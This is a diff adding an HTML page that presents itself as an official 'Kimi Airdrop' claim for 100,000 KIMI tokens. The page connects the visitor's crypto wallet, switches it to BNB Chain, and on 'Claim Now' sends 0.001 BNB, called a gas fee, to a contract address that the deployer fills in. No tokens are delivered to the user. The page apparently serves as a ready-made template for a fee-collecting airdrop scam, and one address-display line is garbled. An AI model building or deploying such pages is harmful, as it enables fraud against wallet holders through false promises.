@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kimi Airdrop - Official Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%); }
+        .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); }
+    </style>
+</head>
+<body class="min-h-screen text-white">
+    <div id="toastContainer" class="fixed top-4 right-4 z-50"></div>
+
+    <nav class="fixed w-full z-50 glass border-b border-slate-700">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 bg-gradient-to-br from-cyan-400 to-purple-500 rounded-2xl flex items-center justify-center font-bold text-xl">K</div>
+                <span class="font-bold text-2xl">Kimi</span>
+            </div>
+            <div id="walletDisplay" class="hidden bg-slate-800 px-4 py-2 rounded-2xl border border-slate-600">
+                <span id="walletAddress" class="font-mono text-sm"></span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="pt-24 pb-16 px-6 max-w-lg mx-auto">
+        <div class="text-center mb-10">
+            <h1 class="text-4xl font-bold mb-2">Kimi Airdrop</h1>
+            <p class="text-cyan-400 font-medium">100,000 KIMI Tokens</p>
+        </div>
+
+        <div class="glass rounded-3xl p-8 border border-slate-600">
+            <div id="notConnected">
+                <button onclick="connectWallet()" 
+                        class="w-full py-7 text-xl font-semibold bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl hover:brightness-110 transition-all">
+                    Connect Wallet
+                </button>
+                <p class="text-center text-xs text-slate-400 mt-6">MetaMask • Trust Wallet • Rainbow • Coinbase</p>
+            </div>
+
+            <div id="connected" class="hidden">
+                <div class="bg-slate-900/60 rounded-2xl p-6 mb-6 text-center">
+                    <p class="text-sm text-slate-400">Claim Amount</p>
+                    <p class="text-4xl font-bold mt-1">100,000 KIMI</p>
+                    <p class="text-amber-400 text-sm mt-3">0.001 BNB gas fee</p>
+                </div>
+
+                <button onclick="claimTokens()" id="claimBtn"
+                        class="w-full py-7 text-xl font-bold bg-gradient-to-r from-emerald-500 to-teal-500 rounded-3xl">
+                    Claim Now
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
+
+    <script>
+        let provider = null;
+        let signer = null;
+        let userAddress = null;
+
+        const CONTRACT_ADDRESS = "0xYOUR_CONTRACT_ADDRESS_HERE"; // ← Change this
+        const WC_PROJECT_ID = "YOUR_WALLETCONNECT_PROJECT_ID"; // ← Get from cloud.walletconnect.com
+
+        async function connectWallet() {
+            const btnContainer = document.getElementById("notConnected");
+            
+            try {
+                // Try WalletConnect first (best for mobile)
+                if (WC_PROJECT_ID && WC_PROJECT_ID !== "YOUR_WALLETCONNECT_PROJECT_ID") {
+                    const wcProvider = await window.EthereumProvider.init({
+                        projectId: WC_PROJECT_ID,
+                        chains: [56],
+                        optionalChains: [1, 137],
+                        methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
+                        showQrModal: true,
+                        qrModalOptions: { themeMode: "dark" }
+                    });
+
+                    await wcProvider.connect();
+                    provider = new ethers.providers.Web3Provider(wcProvider);
+                    signer = provider.getSigner();
+                } else {
+                    // Fallback to injected wallet (MetaMask, Trust Wallet in-app, etc.)
+                    if (!window.ethereum) throw new Error("No wallet found");
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                }
+
+                const accounts = await provider.listAccounts();
+                userAddress = accounts[0];
+
+                // Switch to BNB Chain
+                try {
+                    await window.ethereum?.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                } catch (e) {}
+
+                // Update UI
+                document.getElementById("notConnected").classList.add("hidden");
+                document.getElementById("connected").classList.remove("hidden");
+                document.getElementById("walletDisplay").classList.remove("hidden");
+                document.getElementById("walletAddress").textContent = `\( {userAddress.slice(0,6)}... \){userAddress.slice(-4)}`;
+
+                showToast("Wallet connected successfully!", "success");
+
+            } catch (error) {
+                console.error(error);
+                let msg = "Connection failed";
+                
+                if (error.message?.includes("No wallet found")) {
+                    msg = "Please install a wallet (MetaMask / Trust Wallet)";
+                } else if (error.message?.includes("User rejected")) {
+                    msg = "Connection cancelled by user";
+                } else if (error.message?.includes("projectId")) {
+                    msg = "WalletConnect Project ID missing. Using MetaMask fallback.";
+                }
+                
+                showToast(msg, "error");
+            }
+        }
+
+        async function claimTokens() {
+            const btn = document.getElementById("claimBtn");
+            btn.disabled = true;
+            btn.textContent = "Waiting for confirmation...";
+
+            try {
+                // Replace with your actual contract call
+                const tx = await signer.sendTransaction({
+                    to: CONTRACT_ADDRESS,
+                    value: ethers.utils.parseEther("0.001"),
+                    data: "0x" // Replace with your claim function calldata
+                });
+
+                showToast("Transaction sent! Confirm in wallet", "info");
+                await tx.wait();
+                showToast("✅ Claim successful!", "success");
+            } catch (error) {
+                console.error(error);
+                showToast(error.code === 4001 ? "Transaction rejected" : "Claim failed", "error");
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "Claim Now";
+            }
+        }
+
+        function showToast(message, type = "info") {
+            const toast = document.createElement("div");
+            const colors = type === "success" ? "bg-emerald-500/20 text-emerald-400" : "bg-red-500/20 text-red-400";
+            toast.className = `px-6 py-4 rounded-2xl text-sm font-medium ${colors}`;
+            toast.textContent = message;
+            document.getElementById("toastContainer").appendChild(toast);
+            setTimeout(() => toast.remove(), 5000);
+        }
+
+        // Warning if Project ID not set
+        if (WC_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") {
+            console.warn("⚠️ Please get a free WalletConnect Project ID from https://cloud.walletconnect.com");
+        }
+    </script>
+</body>
+</html>
